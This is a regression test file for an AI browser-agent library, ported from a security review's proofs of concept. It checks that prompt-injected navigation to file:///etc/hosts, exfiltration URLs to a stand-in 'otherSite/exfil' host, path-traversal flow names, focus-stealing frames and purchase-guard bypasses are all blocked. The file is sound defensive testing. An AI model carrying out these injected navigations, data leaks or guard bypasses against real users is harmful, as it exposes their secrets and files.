// Regression tests for the security review, ported from its proofs of
// concept. Each one failed before the fix.
import { execSync } from "node:child_process";
import { existsSync, mkdirSync, readFileSync, statSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { secret, SecretNotAllowedError, type Ghostwright } from "../../src/index.js";
import { lines, mockModel } from "../mock-model.js";
import { startFixtures, type Fixtures } from "../server.js";
import { open, tempStore } from "./helpers.js";

let fx: Fixtures;
beforeAll(async () => { fx = await startFixtures(); });
afterAll(async () => { await fx?.close(); });

const idOf = (view: string, re: RegExp) => lines(view).find(l => re.test(`${l.role} "${l.name}"`))!.id;
const wait = (ms: number) => new Promise(r => setTimeout(r, ms));
const host = () => new URL(fx.url).host;
const logged = (part: string) => fx.requests.filter(r => r.includes(part));

describe("C1 navigation schemes", () => {
  it("refuses file:, chrome:, javascript:, data:, view-source: and friends, before and after", async () => {
    const g = await open({ store: tempStore() });
    try {
      await g.goto(`${fx.url}/books.html`);
      for (const url of ["file:///etc/hosts", "chrome://version", "javascript:document.title='JSRAN'", "data:text/html,<h1>x</h1>", "view-source:" + fx.url, "devtools://devtools/bundled/inspector.html", "filesystem:" + fx.url + "/temporary/x"]) {
        const r = await g.do({ action: "navigate", url });
        expect(r.ok, url).toBe(false);
        expect(r.reason, url).toMatch(/addresses are not opened/);
      }
      expect((await g.goto("file:///etc/hosts")).ok).toBe(false);
      expect(await g.page.title()).toBe("Books – Fixture Shop");
      expect(g.page.url()).toBe(`${fx.url}/books.html`);
    } finally { await g.close(); }
  });

  it("a model told by a page to open a local file gets nothing", async () => {
    let n = 0;
    const m = mockModel({ agent: [] });
    (m as any).generate = async (req: any) => {
      n++;
      if (n === 1) return { text: JSON.stringify({ action: "navigate", url: "file:///etc/hosts" }) };
      if (n === 2) return { text: JSON.stringify({ action: "navigate", url: `${fx.otherSite}/exfil?d=${/localhost/.test(req.prompt) && /127\.0\.0\.1\s+localhost/.test(req.prompt) ? "HOSTSFILE" : "nothing"}` }) };
      return { text: JSON.stringify({ action: "done", success: false, answer: "x" }) };
    };
    const g = await open({ model: m, store: tempStore() });
    try {
      await g.goto(`${fx.url}/sec-inject.html`);
      const r = await g.agent("tell me the mug price", { maxSteps: 4 });
      expect(r.history[0]).toMatch(/addresses are not opened/);
      expect(logged("HOSTSFILE").length).toBe(0);
    } finally { await g.close(); }
  });

  it("file: only with allowFileUrls", async () => {
    const g = await open({ store: tempStore(), allowFileUrls: true });
    try { expect((await g.goto("file:///etc/hosts")).ok).toBe(true); } finally { await g.close(); }
  });
});

describe("C2 secrets typed into the element itself", () => {
  const CANARY = "Kq8$TOCTOU-canary-77";
  const mk = (path: string) => async () => {
    const m = mockModel({ act: req => ({ action: "type", id: idOf(req.prompt, /"Password"/), text: "%pw%" }) });
    const g = await open({ model: m, store: tempStore(), secrets: { pw: secret(CANARY, { origins: [host()] }) } });
    try {
      fx.requests.length = 0;
      await g.goto(`${fx.url}/${path}`);
      await g.act("type %pw% into the password field").catch(() => undefined);
      await wait(800);
      const got = fx.requests.filter(r => r.includes("/log?")).map(r => decodeURIComponent(r.split("=").pop() || ""));
      expect(got.join("")).toBe("");
    } finally { await g.close(); }
  };
  it("a page that redirects on focus to another site gets no keys", mk("sec-redir.html"));
  it("a frame from another site that steals focus gets no keys", mk("sec-steal.html"));
});

describe("H1 H3 secret fields", () => {
  const KEY = "sk-CANARY-" + "A1b2C3d4".repeat(12);
  const PW = "Cx9!canary pw+&=/@Zq#";
  let g: Ghostwright;
  const m = mockModel();
  beforeAll(async () => {
    g = await open({
      model: m, store: tempStore(),
      secrets: { apikey: secret(async () => KEY, { origins: [host()] }), pw: secret(PW, { origins: [host()] }), short: secret("Zq7#pin2", { origins: [host()] }) },
    });
  });
  afterAll(async () => { await g?.close(); });
  const typeInto = (re: RegExp, name: string) => {
    (m as any).generate = mockModel({ act: req => ({ action: "type", id: idOf(req.prompt, re), text: `%${name}%` }) }).generate;
    return g.act(`type %${name}% into the field`);
  };

  it("a field holding a secret shows only 'value hidden', and parts of the value are scrubbed", async () => {
    await g.goto(`${fx.url}/sec-login.html`);
    expect((await typeInto(/textbox "API key"/, "apikey")).ok).toBe(true);
    const v = (await g.observe()).view;
    expect(v).toMatch(/textbox "API key"  value hidden/);
    expect(v).not.toMatch(/hidden \(\d/);
    // the page echoes the first 14 characters: no 8 of them reach a prompt or a result
    const all = [m.calls.map(c => c.prompt).join("\n"), v, JSON.stringify(g.last())].join("\n");
    expect(all.includes(KEY.slice(0, 14))).toBe(false);
    expect(all.includes(KEY.slice(0, 8))).toBe(false);
    expect(await g.page.inputValue("#apikey")).toBe(KEY);
  });

  it("a password's length is not shown", async () => {
    await g.goto(`${fx.url}/sec-login.html`);
    const r = await typeInto(/"Password"/, "pw");
    expect(r.ok).toBe(true);
    expect(r.action).toMatch(/\(hidden\)/);
    const shown = r.result + (await g.observe()).view;
    expect(shown).toMatch(/textbox "Password"  type password, value hidden/);
    expect(shown).not.toMatch(/hidden \(\d|\d+ chars, hidden|value hidden, empty/);
  });

  it("refuses a field shorter than the secret, a search box, a GET form and an editable region", async () => {
    await g.goto(`${fx.url}/sec-login.html`);
    const r1 = await typeInto(/textbox "Code"/, "short");
    expect(r1.ok).toBe(false);
    expect(r1.reason).toMatch(/at most 4 characters/);
    expect(await g.page.inputValue("#code")).toBe("");
    const r2 = await typeInto(/searchbox "Search"/, "pw");
    expect(r2.reason).toMatch(/search box/);
    const r3 = await typeInto(/textbox "Member number"/, "pw");
    expect(r3.reason).toMatch(/GET/);
    const r4 = await typeInto(/textbox "Notes"/, "pw");
    expect(r4.reason).toMatch(/text field/);
    expect(logged("/search?q=").length + logged("/lookup?m=").length).toBe(0);
  });

  it("act() types only the secrets its instruction names", async () => {
    await g.goto(`${fx.url}/sec-login.html`);
    (m as any).generate = mockModel({ act: req => ({ action: "type", id: idOf(req.prompt, /"Password"/), text: "%pw%" }) }).generate;
    await expect(g.act("fill in the form")).rejects.toBeInstanceOf(SecretNotAllowedError);
    expect(await g.page.inputValue("#pw")).toBe("");
  });

  it("agent() types only the secrets its task names or lists", async () => {
    await g.goto(`${fx.url}/sec-login.html`);
    let n = 0;
    (m as any).generate = async (req: any) => ({ text: JSON.stringify(++n === 1 ? { action: "type", id: idOf(req.prompt, /"Password"/), text: "%pw%" } : { action: "done", success: false, answer: "no" }) });
    const r = await g.agent("sign in");
    expect(r.history[0]).toMatch(/not named/);
    expect(await g.page.inputValue("#pw")).toBe("");
  });
});

describe("H2 hybrid screenshots", () => {
  it("no screenshot goes to the model while a field holding a secret is on screen", async () => {
    let n = 0;
    const images: number[] = [];
    const m = mockModel();
    (m as any).generate = async (req: any) => {
      images.push(req.images?.length || 0);
      return { text: JSON.stringify(++n === 1 ? { action: "type", id: idOf(req.prompt, /textbox "API key"/), text: "%k%" } : { action: "done", success: false, answer: "x" }) };
    };
    const g = await open({ model: m, store: tempStore(), secrets: { k: secret("visible-token-123456", { origins: [host()] }) } });
    try {
      await g.goto(`${fx.url}/sec-login.html`);
      await g.agent("type %k% into the API key field", { mode: "hybrid", maxSteps: 3 });
      expect(images[0]).toBe(1);
      expect(images[1]).toBe(0);
    } finally { await g.close(); }
  });
});

describe("H4 purchase guard in the browser", () => {
  let g: Ghostwright;
  const orders = (c: string) => fx.requests.filter(r => r.startsWith("POST") && r.includes("case=" + c)).length;
  beforeAll(async () => { g = await open({ store: tempStore() }); });
  afterAll(async () => { await g?.close(); });
  const view = async () => (await g.observe()).view;

  it("a Japanese confirm-order button, an unlabelled image submit, a card form", async () => {
    await g.goto(`${fx.url}/sec-shop.html`);
    const v = await view();
    expect((await g.do({ action: "click", id: idOf(v, /button "注文を確定する"/) })).reason).toMatch(/purchase_blocked/);
    await g.goto(`${fx.url}/sec-shop.html`);
    // an image submit with no alt: the view calls it "Submit"; the guard sees no label of its own
    const img = lines(await view()).find(l => l.role === "button" && l.name === "Submit")!;
    expect((await g.do({ action: "click", id: img.id })).reason).toMatch(/purchase_blocked/);
    await g.goto(`${fx.url}/sec-shop.html`);
    expect((await g.do({ action: "click", role: "button", name: "Continue" })).reason).toMatch(/card fields/);
    await wait(300);
    expect(orders("ja") + orders("img") + orders("card")).toBe(0);
  });

  it("Space on a focused order button, Enter anywhere in a key sequence, a newline in text, a form= button", async () => {
    await g.goto(`${fx.url}/sec-shop.html`);
    let v = await view();
    await g.do({ action: "type", id: idOf(v, /"Coupon C"/), text: "SAVE10" });
    await g.do({ action: "press", keys: "Tab" });
    expect((await g.do({ action: "press", keys: "Space" })).reason).toMatch(/purchase_blocked/);
    await g.do({ action: "type", id: idOf(v, /"Coupon C"/), text: "SAVE10" });
    expect((await g.do({ action: "press", keys: "Enter Shift" })).reason).toMatch(/purchase_blocked/);
    expect((await g.do({ action: "type", id: idOf(v, /"Coupon C"/), text: "SAVE10\n" })).reason).toMatch(/purchase_blocked/);
    v = await view();
    expect((await g.do({ action: "type", id: idOf(v, /"Coupon D"/), text: "SAVE10", submit: true })).reason).toMatch(/purchase_blocked/);
    await wait(300);
    expect(orders("keys") + orders("formattr")).toBe(0);
  });

  it("a click by point on a pay button inside a frame from another site", async () => {
    await g.goto(`${fx.url}/sec-shop.html`);
    await wait(500);
    const box = (await g.page.locator("iframe").boundingBox())!;
    const r = await g.do({ action: "click", x: box.x + 140, y: box.y + 35 });
    expect(r.reason).toMatch(/purchase_blocked: "pay now"/);
    await wait(300);
    expect(orders("iframe-point")).toBe(0);
  });
});

describe("H5 sandbox", () => {
  it("local Chrome runs with its sandbox on", async () => {
    const g = await open({ store: tempStore() });
    try {
      let args = "";
      // this test's own browser: the Chrome this process started (other Chromes on the machine do not count)
      try {
        args = execSync("ps -axww -o ppid=,args=").toString().split("\n")
          .filter(l => l.trim().startsWith(String(process.pid) + " ") && l.includes("playwright_chromiumdev_profile") && !l.includes("--type="))[0] || "";
      } catch { /* none */ }
      expect(args).toContain("playwright_chromiumdev_profile");
      expect(args).not.toContain("--no-sandbox");
    } finally { await g.close(); }
  });
});

describe("H6 M2 shared flow files", () => {
  it("a recipe's own name never decides where versions are written", async () => {
    const root = tempStore();
    writeFileSync(join(root, "package.json"), JSON.stringify({ name: "victim", scripts: {} }));
    const store = join(root, ".ghostwright");
    mkdirSync(join(store, "flows"), { recursive: true });
    writeFileSync(join(store, "flows", "shared.json"), JSON.stringify({
      name: "../../package", version: 1, params: { type: "object", properties: {} }, output: { type: "object", properties: {} },
      steps: [{ id: "s1", kind: "navigate", url: `${fx.url}/checkout.html` }, { id: "s2", kind: "click", target: { role: "button", name: "Gone" }, goal: "click Add to cart" }],
      repair: { mode: "auto" },
    }));
    const m = mockModel({ act: req => ({ action: "click", id: idOf(req.prompt, /button "Add to cart"/) }) });
    const g = await open({ model: m, store });
    try {
      const r = await g.run("shared");
      expect(r.promoted).toBe(2);
      expect(JSON.parse(readFileSync(join(root, "package.json"), "utf8")).scripts).toEqual({});
      expect(existsSync(join(store, "flows", "shared", "v2.json"))).toBe(true);
      expect(JSON.parse(readFileSync(join(store, "flows", "shared.json"), "utf8")).name).toBe("shared");
      // files for the owner only
      expect((statSync(join(store, "flows", "shared.json")).mode & 0o777).toString(8)).toBe("600");
      expect((statSync(join(store, "flows", "shared")).mode & 0o777).toString(8)).toBe("700");
    } finally { await g.close(); }
  });

  it("a repair that goes to a new host stays a draft, and the model-free replay never goes there", async () => {
    const store = tempStore();
    mkdirSync(join(store, "flows"), { recursive: true });
    writeFileSync(join(store, "flows", "daily.json"), JSON.stringify({
      name: "daily", version: 1, params: { type: "object", properties: {} }, output: { type: "object", properties: {} },
      steps: [{ id: "s1", kind: "navigate", url: `${fx.url}/sec-inject.html` }, { id: "s2", kind: "click", target: { role: "button", name: "Next" }, goal: "click Next" }],
      repair: { mode: "auto" },
    }));
    const m = mockModel({ act: () => ({ action: "navigate", url: `${fx.otherSite}/exfil?persist=1` }) });
    let g = await open({ model: m, store });
    const r1 = await g.run("daily");
    await g.close();
    expect(r1.promoted).toBeUndefined();
    expect(r1.draft?.why).toMatch(/new host/);
    expect(JSON.parse(readFileSync(join(store, "flows", "daily.json"), "utf8")).version).toBe(1);
    fx.requests.length = 0;
    g = await open({ store });
    await g.run("daily").catch(() => undefined);
    await g.close();
    expect(logged("persist=1").length).toBe(0);
  });
});

describe("M3 allowedOrigins before requests", () => {
  it("a popup to another origin is closed and its request never sent", async () => {
    const g = await open({ store: tempStore(), allowedOrigins: [host()] });
    try {
      fx.requests.length = 0;
      await g.goto(`${fx.url}/sec-inject.html`);
      await g.do({ action: "click", role: "link", name: "Partner offer" });
      await g.do({ action: "click", role: "link", name: "Open offer" });
      await wait(1000);
      const tabs = await g.tabs();
      expect(tabs.every(t => !t.url.includes("127.0.0.1"))).toBe(true);
      expect(logged("/exfil").length).toBe(0);
    } finally { await g.close(); }
  });
});

describe("R1 a popup's first request cannot crash the process", () => {
  it("window.open to another origin under allowedOrigins: blocked, closed, no uncaught exception", async () => {
    const uncaught: unknown[] = [];
    const onErr = (e: unknown) => uncaught.push(e);
    process.on("uncaughtException", onErr);
    process.on("unhandledRejection", onErr);
    const g = await open({ store: tempStore(), allowedOrigins: [host()] });
    try {
      fx.requests.length = 0;
      await g.goto(`${fx.url}/sec-popup.html`);
      await g.do({ action: "click", role: "button", name: "See offer" });
      await g.do({ action: "click", role: "button", name: "See more" });
      await wait(1500);
      expect(uncaught).toEqual([]);
      expect(logged("popup=n5").length).toBe(0);
      expect((await g.tabs()).every(t => !t.url.includes("127.0.0.1"))).toBe(true);
    } finally {
      await g.close();
      process.off("uncaughtException", onErr);
      process.off("unhandledRejection", onErr);
    }
  });
});

describe("R2 secrets and forms that send fields in the address", () => {
  const CANARY = "Kq8$TOCTOU-canary-77";
  const enc = new URLSearchParams({ q: CANARY }).toString().slice(2);
  it("refuses a submit button with formmethod=get; stops a GET page load that carries the secret", async () => {
    const m = mockModel();
    const g = await open({ model: m, store: tempStore(), secrets: { pw: secret(CANARY, { origins: [host()] }) } });
    const typeInto = (name: string, submit = false) => {
      (m as any).generate = mockModel({ act: req => ({ action: "type", id: idOf(req.prompt, new RegExp(`"${name}"`)), text: "%pw%", submit }) }).generate;
      return g.act(`enter %pw% as the ${name}`);
    };
    try {
      fx.requests.length = 0;
      await g.goto(`${fx.url}/sec-getforms.html`);
      // no method: typed, but the browser's GET that would carry it is stopped before it is sent
      const a = await typeInto("Token A", true);
      expect(a.ok).toBe(false);
      expect(a.reason).toMatch(/carried a secret in its address/);
      await g.goto(`${fx.url}/sec-getforms.html`);
      expect((await typeInto("Token B", true)).reason).toMatch(/GET/);
      // a POST form whose script sends the field in an address: the request is stopped before it is sent
      const r = await typeInto("Token C", true);
      expect(r.ok).toBe(false);
      expect(r.reason).toMatch(/carried a secret in its address/);
      await wait(400);
      expect(fx.requests.filter(x => x.includes(enc.slice(0, 10))).length).toBe(0);
      expect(logged("/search?q=").length).toBe(0);
    } finally { await g.close(); }
  });

  it("a form with no method that a script posts works; the same kind of form sent natively as GET is stopped with nothing sent", async () => {
    fx.creds = { email: "ada@example.com", password: CANARY };
    const m = mockModel();
    const g = await open({ model: m, store: tempStore(), secrets: { pw: secret(CANARY, { origins: [host()] }) } });
    const typeInto = (name: string) => {
      (m as any).generate = mockModel({ act: req => ({ action: "type", id: idOf(req.prompt, new RegExp(`"${name}"`)), text: "%pw%", submit: true }) }).generate;
      return g.act(`enter %pw% as the ${name}`);
    };
    try {
      fx.requests.length = 0;
      await g.goto(`${fx.url}/sec-spa.html`);
      const spa = await typeInto("App password");
      expect(spa.ok).toBe(true);
      await wait(300);
      expect(await g.page.textContent("#state")).toBe("Signed in as Ada");
      expect(logged("POST").some(x => x.includes("/api/login"))).toBe(true);
      const plain = await typeInto("Plain token");
      expect(plain.ok).toBe(false);
      expect(plain.reason).toMatch(/carried a secret in its address/);
      await wait(400);
      expect(logged("/spa-get").length).toBe(0);
      expect(fx.requests.filter(x => x.includes(enc.slice(0, 10))).length).toBe(0);
    } finally { fx.creds = { email: "ada@example.com", password: "pw" }; await g.close(); }
  });
});

describe("R3 hybrid screenshots and secrets the page mirrors", () => {
  it("no screenshot while the page shows a secret's value anywhere in view", async () => {
    let n = 0;
    const images: number[] = [];
    const m = mockModel();
    (m as any).generate = async (req: any) => {
      images.push(req.images?.length || 0);
      n++;
      return { text: JSON.stringify(n === 1 ? { action: "type", id: idOf(req.prompt, /"API token"/), text: "%pw%" } : n === 2 ? { action: "scroll", dy: 1400 } : { action: "done", success: false, answer: "x" }) };
    };
    const g = await open({ model: m, store: tempStore(), secrets: { pw: secret("Kq8$mirror-canary-55", { origins: [host()] }) } });
    try {
      await g.goto(`${fx.url}/sec-mirror.html`);
      await g.agent("save %pw% as the token", { mode: "hybrid", maxSteps: 3 });
      expect(images[0]).toBe(1);   // nothing secret yet
      expect(images[1]).toBe(0);   // the field holds it
      expect(images[2]).toBe(0);   // scrolled: the field is gone, the page's copy is in view
    } finally { await g.close(); }
  });
});

describe("M4 extract from HTML is offline", () => {
  it("scripts do not run and nothing is fetched", async () => {
    const m = mockModel({ extract: () => ({ title: "Invoice" }) });
    const g = await open({ model: m, store: tempStore() });
    try {
      fx.requests.length = 0;
      const port = new URL(fx.otherSite).port;
      const html = `<html><body><h1>Invoice</h1><img src="${fx.otherSite}/exfil?img=1">
<script>try { new WebSocket('ws://127.0.0.1:${port}/exfil-ws'); } catch (e) {} try { window.open('${fx.otherSite}/exfil?popup=1'); } catch (e) {} try { fetch('${fx.otherSite}/exfil?fetch=1'); } catch (e) {}</script></body></html>`;
      const r = await g.extract("the title", { type: "object", properties: { title: { type: "string" } } }, { html });
      expect(r.data).toEqual({ title: "Invoice" });
      await wait(1200);
      expect(logged("exfil").length).toBe(0);
    } finally { await g.close(); }
  });
});
